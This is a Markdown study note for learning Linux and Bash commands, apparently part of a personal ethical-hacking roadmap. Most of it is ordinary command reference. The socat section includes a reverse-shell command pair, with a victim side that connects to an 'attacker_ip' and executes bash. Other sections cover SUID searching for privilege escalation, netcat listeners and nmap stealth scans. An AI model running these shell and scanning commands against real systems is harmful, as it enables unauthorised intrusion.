# Day 4 — Linux Advanced + Bash Scripting
> **Goal:** Learn the core Linux commands used in security, scripting, and networking.
> Push this file to GitHub after reading. Each section = one concept. Build the habit.

---

## Table of Contents
1. [File Operations](#1-file-operations)
2. [Search & Text Processing](#2-search--text-processing)
3. [Encoding & Binary Analysis](#3-encoding--binary-analysis)
4. [Compression & Archives](#4-compression--archives)
5. [Permissions & Ownership](#5-permissions--ownership)
6. [Processes & Services](#6-processes--services)
7. [Networking Basics](#7-networking-basics)
8. [Offensive Networking Tools](#8-offensive-networking-tools)
9. [Quick Reference Cheatsheet](#9-quick-reference-cheatsheet)

---

## 1. File Operations

### `cat` — Read a file
Print file contents to the screen.

```bash
cat filename.txt           # print file
cat -n filename.txt        # print with line numbers
cat file1.txt file2.txt    # print two files together
```

**Real use in security:** `cat /etc/passwd` — see all user accounts on the system.

---

### `find` — Search for files by name, type, size, date
The most powerful file-search command.

```bash
find /path -name "*.log"           # find all .log files
find / -name "passwd" 2>/dev/null  # find 'passwd' file, hide errors
find / -type f -size +10M          # files bigger than 10MB
find / -perm -4000                 # find SUID files (privilege escalation!)
find . -mtime -1                   # files modified in last 1 day
```

**Syntax breakdown:**
| Part | Meaning |
|------|---------|
| `/path` | Where to start searching |
| `-name` | Match by filename |
| `-type f` | Files only (`d` = directories) |
| `-size +10M` | Bigger than 10MB |
| `-perm -4000` | Has SUID bit set |
| `2>/dev/null` | Send error messages to trash |

---

### `du` — Disk Usage
How much space files/directories take.

```bash
du -sh /var/log          # human-readable size of /var/log
du -sh *                 # size of everything in current folder
du -h --max-depth=1 /    # top-level folder sizes
```

> `-s` = summarize (total only), `-h` = human readable (MB/GB)

---

### `mkdir` — Make Directory

```bash
mkdir myfolder                  # create one folder
mkdir -p a/b/c                  # create nested folders in one shot
mkdir -p ~/projects/day4/notes  # create full path
```

> `-p` means "create parent directories too, don't error if they exist"

---

### `cp` — Copy Files

```bash
cp file.txt copy.txt         # copy file
cp -r folder/ backup/        # copy folder recursively
cp -p file.txt dest/         # copy and preserve permissions/timestamps
```

---

### `mv` — Move or Rename

```bash
mv old.txt new.txt           # rename file
mv file.txt /tmp/            # move file to /tmp
mv folder/ /opt/myfolder/    # move a directory
```

> `mv` is destructive — original is gone after move. Unlike `cp`.

---

### `file` — Identify File Type
Linux doesn't trust file extensions. `file` looks at the actual contents.

```bash
file image.jpg        # JPEG image data
file script.sh        # Bourne-Again shell script
file binary           # ELF 64-bit LSB executable
file mystery.dat      # could be anything!
```

**Why this matters in security:** Attackers rename malware as `.txt` or `.jpg`. `file` sees through that.

---

## 2. Search & Text Processing

### `grep` — Search Inside Files
Searches for a pattern (text or regex) inside files.

```bash
grep "error" logfile.txt              # find lines with "error"
grep -i "error" logfile.txt           # case-insensitive
grep -r "password" /etc/              # search recursively in a directory
grep -n "failed" auth.log             # show line numbers
grep -v "INFO" app.log                # show lines that do NOT have INFO
grep -E "failed|error|denied" syslog  # match multiple patterns (OR)
grep -oP 'from \K[\d.]+'  auth.log   # extract only the matching part (IP address)
```

**Syntax breakdown:**
| Flag | Meaning |
|------|---------|
| `-i` | Case insensitive |
| `-r` | Recursive (search all files in folder) |
| `-n` | Show line number |
| `-v` | Invert (show non-matching lines) |
| `-c` | Count matching lines |
| `-o` | Print only the matched text, not the full line |
| `-P` | Use Perl regex (more powerful) |
| `-E` | Extended regex (enables `|` for OR) |

**Security use:** `grep -r "password" /var/www/` — find hardcoded passwords in web app code.

---

### `sort` — Sort Lines

```bash
sort names.txt              # alphabetical
sort -r names.txt           # reverse alphabetical
sort -n numbers.txt         # numeric sort
sort -rn numbers.txt        # numeric, highest first
sort -u names.txt           # sort and remove duplicates
```

---

### `uniq` — Remove/Count Duplicates
**Must sort first before using uniq.**

```bash
sort ips.txt | uniq             # remove duplicate lines
sort ips.txt | uniq -c          # count how many times each appears
sort ips.txt | uniq -c | sort -rn   # top offenders, sorted by count
```

> The pipeline `sort | uniq -c | sort -rn` is the most common pattern in log analysis.

---

### `strings` — Extract Readable Text from Binary Files
Pulls out human-readable strings from executables, images, or any binary.

```bash
strings /usr/bin/ls            # see strings inside the ls binary
strings malware.exe            # look for URLs, IPs, function names
strings image.jpg | grep http  # look for hidden URLs in an image
```

**Security use:** First thing you run on a suspicious binary in malware analysis.

---

## 3. Encoding & Binary Analysis

### `xxd` — Hex Dump
Shows a file in hexadecimal + ASCII side by side.

```bash
xxd file.bin               # full hex dump
xxd file.bin | head -20    # first 20 lines only
xxd -r hexfile.txt out.bin # reverse: hex back to binary
echo "hello" | xxd         # hex dump of a string
```

**Example output:**
```
00000000: 6865 6c6c 6f0a  hello.
```
Left = memory address | Middle = hex bytes | Right = ASCII text

**Why it matters:** Check file magic bytes (first bytes of a file identify its type), analyze malware, examine network packets.

---

### `Hexadecimal` — The Number System
Hex is base-16: digits are `0-9` then `A-F`.

```
Decimal:  0  1  2  3  4  5  6  7  8  9  10  11  12  13  14  15
Hex:      0  1  2  3  4  5  6  7  8  9   A   B   C   D   E   F
```

| Hex | Decimal | Binary |
|-----|---------|--------|
| 0x41 | 65 | 01000001 |
| 0xFF | 255 | 11111111 |
| 0x7F | 127 | 01111111 |

> In Linux, `0x` prefix means hex. So `0x41` = letter 'A' in ASCII.

---

### `Base64` — Encode/Decode

Base64 converts binary data into safe printable text. Used everywhere: email attachments, web tokens (JWT), malware obfuscation.

```bash
echo "hello world" | base64          # encode  → aGVsbG8gd29ybGQ=
echo "aGVsbG8gd29ybGQ=" | base64 -d  # decode  → hello world

base64 file.png > file.b64           # encode a file
base64 -d file.b64 > restored.png    # decode back

# Real malware example: attackers hide payloads in base64
echo "cGFzc3dvcmQ=" | base64 -d     # → password
```

---

### `tr` — Translate/Replace Characters

```bash
echo "hello" | tr 'a-z' 'A-Z'    # lowercase to UPPERCASE → HELLO
echo "hello world" | tr -d ' '   # delete spaces → helloworld
echo "hello" | tr 'a-z' 'n-za-m' # ROT13 cipher!
cat file.txt | tr -s ' '         # squeeze multiple spaces into one
```

| Flag | Meaning |
|------|---------|
| `-d` | Delete characters |
| `-s` | Squeeze repeated characters |

---

## 4. Compression & Archives

### `gzip` / `gunzip` — Compress/Decompress Single Files

```bash
gzip file.txt            # compress → creates file.txt.gz (original deleted)
gzip -k file.txt         # compress but keep original (-k = keep)
gunzip file.txt.gz       # decompress → restores file.txt
gzip -d file.txt.gz      # same as gunzip
gzip -l file.txt.gz      # list compression ratio info
```

---

### `bzip2` / `bunzip2` — Better Compression (Slower)

```bash
bzip2 file.txt           # compress → file.txt.bz2
bunzip2 file.txt.bz2     # decompress
bzip2 -k file.txt        # keep original
```

> `bzip2` = better compression ratio than gzip. `gzip` = faster.

---

### `tar` — Archive Multiple Files
`tar` bundles files together. Combine with gzip/bzip2 for compressed archives.

```bash
# CREATE archives
tar -cvf archive.tar folder/          # bundle folder into .tar
tar -czvf archive.tar.gz folder/      # bundle + gzip compress
tar -cjvf archive.tar.bz2 folder/     # bundle + bzip2 compress

# EXTRACT archives
tar -xvf archive.tar                  # extract .tar
tar -xzvf archive.tar.gz              # extract .tar.gz
tar -xjvf archive.tar.bz2             # extract .tar.bz2

# LIST contents without extracting
tar -tvf archive.tar.gz
```

**Flags decoded:**
| Flag | Meaning |
|------|---------|
| `-c` | Create archive |
| `-x` | Extract archive |
| `-v` | Verbose (show filenames) |
| `-f` | File name follows |
| `-z` | Use gzip |
| `-j` | Use bzip2 |
| `-t` | List contents |

> Memory trick: **c**reate, e**x**tract, **v**erbose, **f**ile

---

## 5. Permissions & Ownership

### Understanding Linux Permissions
Every file has 3 sets of permissions for 3 groups:

```
-rwxr-xr--
│├─┤├─┤├─┤
│ │  │  └── others  (everyone else)
│ │  └───── group   (the file's group)
│ └──────── owner   (the file's owner)
└────────── file type (- = file, d = directory, l = symlink)
```

Each set: `r` = read (4), `w` = write (2), `x` = execute (1)

```
rwx = 4+2+1 = 7   (full access)
rw- = 4+2+0 = 6   (read and write)
r-x = 4+0+1 = 5   (read and execute)
r-- = 4+0+0 = 4   (read only)
--- = 0+0+0 = 0   (no access)
```

So `chmod 755` means: owner=7(rwx), group=5(r-x), others=5(r-x)

---

### `chmod` — Change File Permissions

```bash
# Numeric mode (most common)
chmod 755 script.sh      # owner: rwx, group: r-x, others: r-x
chmod 644 file.txt       # owner: rw-, group: r--, others: r--
chmod 600 id_rsa         # SSH private key — owner only!
chmod 777 file.txt       # everyone full access (dangerous!)

# Symbolic mode (easier to read)
chmod +x script.sh       # add execute for everyone
chmod u+x script.sh      # add execute for owner only (u=user)
chmod g-w file.txt       # remove write from group
chmod o-r secret.txt     # remove read from others
chmod a+r file.txt       # add read for all (a=all)
```

**Security rule:** SSH private keys must be `chmod 600` — SSH refuses to use them if they're world-readable.

---

### `chown` — Change File Owner/Group

```bash
chown alice file.txt           # change owner to alice
chown alice:developers file.txt # change owner AND group
chown -R alice /var/www/       # recursively change all files in folder
chown :developers file.txt     # change group only
```

> Only root can change ownership. Use `sudo chown`.

---

### `umask` — Default Permissions for New Files

When you create a file, its default permissions are set by `umask`.

```bash
umask            # show current umask (e.g., 0022)
umask 027        # set umask (more restrictive)
```

**How it works:** Subtract umask from the max permissions.
- Files max = `666` → `666 - 022 = 644` (rw-r--r--)
- Dirs max = `777` → `777 - 022 = 755` (rwxr-xr-x)

---

### `ssh` — Secure Shell (Remote Login)

```bash
ssh user@192.168.1.10             # connect to remote machine
ssh -p 2222 user@host             # connect on non-standard port
ssh -i ~/.ssh/id_rsa user@host    # use specific private key
ssh -L 8080:localhost:80 user@host # port forwarding (tunneling)
```

**First time connecting:** SSH asks you to verify the server fingerprint. Type `yes` to accept and it gets saved to `~/.ssh/known_hosts`.

---

### `scp` — Secure Copy (File Transfer Over SSH)

```bash
scp file.txt user@host:/tmp/          # upload file to remote
scp user@host:/var/log/auth.log ./    # download file from remote
scp -r folder/ user@host:/opt/        # upload entire folder
scp -P 2222 file.txt user@host:~/     # use non-standard port
```

> `scp` syntax: `scp [source] [destination]` — just like `cp` but one side has `user@host:path`

---

## 6. Processes & Services

### `ps` — List Running Processes

```bash
ps aux                          # show ALL processes (most used)
ps aux | grep nginx             # find nginx process
ps -ef                          # full format with parent IDs
ps aux --sort=-%cpu | head -10  # top 10 CPU-hungry processes
ps aux --sort=-%mem | head -10  # top 10 memory-hungry processes
```

**ps aux columns:**
```
USER   PID  %CPU  %MEM  VSZ    RSS   TTY  STAT  START  TIME  COMMAND
root    1    0.0   0.1   225k   9k    ?    Ss    10:00  0:01  /sbin/init
```

| Column | Meaning |
|--------|---------|
| PID | Process ID (unique number) |
| %CPU | CPU usage |
| %MEM | Memory usage |
| STAT | Process state (R=running, S=sleeping, Z=zombie) |
| COMMAND | The actual program running |

---

### `cron` — Scheduled Tasks
Cron runs commands automatically on a schedule. Like Task Scheduler in Windows.

```bash
crontab -e      # edit your cron jobs (opens in text editor)
crontab -l      # list your current cron jobs
crontab -r      # delete ALL your cron jobs (careful!)
```

**Cron syntax — 5 time fields:**
```
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0=Sunday, 6=Saturday)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)
```

**Examples:**
```bash
# Run log scanner every day at 2am
0 2 * * * /home/user/log_scanner.sh >> /var/log/scanner.log

# Run every 5 minutes
*/5 * * * * /scripts/check.sh

# Run every Monday at 9am
0 9 * * 1 /scripts/weekly_backup.sh

# Run on the 1st of every month at midnight
0 0 1 * * /scripts/monthly_report.sh
```

> Use [crontab.guru](https://crontab.guru) to build/test cron expressions.

---

### `systemctl` — Manage System Services
Controls services (daemons) that run in the background.

```bash
# Service control
systemctl start nginx         # start a service
systemctl stop nginx          # stop a service
systemctl restart nginx       # restart (stop + start)
systemctl reload nginx        # reload config without restart

# Service status
systemctl status nginx        # is it running? any errors?
systemctl is-active nginx     # simple active/inactive check

# Enable/disable at boot
systemctl enable nginx        # start automatically on boot
systemctl disable nginx       # do NOT start on boot

# List services
systemctl list-units --type=service          # all active services
systemctl list-units --type=service --all    # including stopped ones
```

**Security use:** `systemctl list-units --type=service` — look for unfamiliar services that could be malware persistence.

---

## 7. Networking Basics

### `netstat` — Network Connections (Classic)
> Note: `netstat` is older. Use `ss` on modern systems. But you'll see `netstat` everywhere.

```bash
netstat -tuln          # show all listening ports (no DNS lookup)
netstat -tulnp         # same + show which program owns the port
netstat -an            # all connections, numeric
netstat -s             # network statistics summary
```

**Flags:**
| Flag | Meaning |
|------|---------|
| `-t` | TCP connections |
| `-u` | UDP connections |
| `-l` | Listening ports only |
| `-n` | Show IP/port numbers (not hostnames) |
| `-p` | Show process name/PID |

---

### `ss` — Socket Statistics (Modern netstat)
Same job as netstat, but faster and more info.

```bash
ss -tuln          # listening TCP/UDP ports
ss -tulnp         # + process info (need sudo for all)
ss -s             # summary stats
ss -t state established  # all active TCP connections
ss -o             # show timer info
```

> `ss` = socket statistics. If you can use `ss`, use it over `netstat`.

---

### `telnet` — Old-School Remote Login / Port Test
Telnet is unencrypted (use SSH instead). But it's great for **testing if a port is open**.

```bash
telnet 192.168.1.1 80        # is port 80 open on this host?
telnet google.com 443        # test HTTPS port
```

If you get a response, the port is open. If it hangs or says "Connection refused", it's closed/filtered.

> **Never use telnet for actual remote login** — everything is sent in plaintext. Attacker on the same network can read your password.

---

### `nmap` — Network Scanner
The most important recon tool in hacking. Scans networks and finds open ports, services, OS info.

```bash
nmap 192.168.1.1               # basic scan — top 1000 ports
nmap -sV 192.168.1.1           # detect service versions
nmap -O 192.168.1.1            # detect OS (needs root)
nmap -sC 192.168.1.1           # run default scripts
nmap -p 80,443,22 192.168.1.1  # scan specific ports only
nmap -p- 192.168.1.1           # scan ALL 65535 ports
nmap -A 192.168.1.1            # aggressive: OS + version + scripts
nmap 192.168.1.0/24            # scan entire subnet
nmap -sn 192.168.1.0/24        # ping sweep (host discovery only)
nmap -sS 192.168.1.1           # stealth SYN scan (root required)
```

**nmap output states:**
| State | Meaning |
|-------|---------|
| open | Port is open, service is running |
| closed | Port is reachable but nothing listening |
| filtered | Firewall blocking — can't determine |

> **Always get permission before scanning.** Scanning without permission is illegal.

---

## 8. Offensive Networking Tools

### `nc` / `ncat` — Netcat — The Swiss Army Knife
Netcat can create TCP/UDP connections for anything. Port scanning, file transfer, shells.

```bash
# Test if port is open
nc -zv 192.168.1.1 80

# Listen on a port (server mode)
nc -lvp 4444

# Connect to a listener (client mode)
nc 192.168.1.1 4444

# File transfer
nc -lvp 4444 > received.txt          # receiver listens
nc 192.168.1.1 4444 < file.txt       # sender connects

# Banner grabbing (what service is running on a port?)
echo "" | nc -v 192.168.1.1 22       # grab SSH banner
```

**Flags:**
| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-p` | Port number |
| `-z` | Zero-I/O (just check, don't send data) |
| `-n` | No DNS lookup |
| `-u` | UDP mode |

---

### `socat` — Netcat on Steroids
More powerful than netcat. Can do SSL, relay connections, PTY shells.

```bash
# Basic connection (like nc)
socat TCP:192.168.1.1:80 -

# Listen and print
socat TCP-LISTEN:4444 -

# File transfer
socat TCP-LISTEN:4444 FILE:received.txt    # receiver
socat TCP:192.168.1.1:4444 FILE:send.txt   # sender

# Fully interactive TTY shell (useful in CTFs)
socat TCP-LISTEN:4444 FILE:`tty`,raw,echo=0      # attacker
socat TCP:attacker_ip:4444 EXEC:bash,pty,stderr  # victim
```

---

### `openssl` — Swiss Army Knife for Cryptography

```bash
# Generate RSA key pair
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key

# Encrypt / decrypt a file
openssl enc -aes-256-cbc -in file.txt -out file.enc -k password
openssl enc -aes-256-cbc -d -in file.enc -out file.txt -k password

# Hash a file
openssl dgst -sha256 file.txt
openssl dgst -md5 file.txt

# Generate random bytes
openssl rand -hex 16         # random 16-byte hex string
openssl rand -base64 32      # random 32-byte base64

# Check certificate info
openssl x509 -in cert.pem -text -noout
```

---

### `openssl s_client` — Test SSL/TLS Connections
Connect to any HTTPS/TLS server and inspect the certificate.

```bash
# Connect and see certificate
openssl s_client -connect google.com:443

# Check certificate expiry
openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates

# Test specific TLS version
openssl s_client -connect host:443 -tls1_2

# Show certificate chain
openssl s_client -connect host:443 -showcerts
```

**What to look for in output:**
- `Certificate chain` — who signed the cert
- `subject=` — who the cert belongs to
- `notAfter=` — expiry date
- `Verify return code: 0 (ok)` — cert is valid

---

## 9. Quick Reference Cheatsheet

```
CATEGORY          COMMAND        WHAT IT DOES
─────────────────────────────────────────────────────────
Files             cat            Read file
                  find           Search for files
                  du -sh         Disk usage
                  mkdir -p       Create nested dirs
                  cp -r          Copy recursively
                  mv             Move or rename
                  file           Identify file type

Search/Text       grep -r        Search in files recursively
                  sort -rn       Sort numerically, reversed
                  uniq -c        Count duplicates
                  strings        Extract text from binary
                  tr             Replace/delete characters

Binary/Encoding   xxd            Hex dump
                  base64         Encode/decode
                  openssl dgst   Hash files

Compression       gzip/gunzip    Compress/decompress
                  bzip2/bunzip2  Better compression
                  tar -czvf      Create .tar.gz
                  tar -xzvf      Extract .tar.gz

Permissions       chmod 755      Set permissions numeric
                  chmod +x       Add execute bit
                  chown user:grp Change owner/group
                  umask          Default new file perms

Remote/Transfer   ssh user@host  Remote login
                  scp            Secure file copy

Processes         ps aux         All running processes
                  crontab -e     Edit scheduled tasks
                  systemctl      Manage services

Networking        netstat -tuln  Listening ports (old)
                  ss -tuln       Listening ports (new)
                  nmap           Network/port scanner
                  telnet host 80 Test port open

Tools             nc -lvp        Listen on port
                  socat          Advanced connections
                  openssl        Crypto operations
                  openssl s_client  Test SSL/TLS
```

---

## My Lab Notes

> Fill these in as you practice:

**Commands I tried today:**
- [ ] `find / -perm -4000 2>/dev/null` — SUID files
- [ ] `ps aux | grep ssh`
- [ ] `ss -tuln`
- [ ] `openssl s_client -connect google.com:443`
- [ ] `echo "test" | base64 | base64 -d`
- [ ] `nc -zv 192.168.1.1 80`
- [ ] `crontab -l`
- [ ] `systemctl list-units --type=service`

**Things I didn't understand and need to revisit:**
-
-

**Interesting thing I found:**
-

---

*Day 4 — Month 1 — Security+ / Ethical Hacking roadmap*
*Push this file: `git add . && git commit -m "Day 4: Linux commands notes" && git push`*
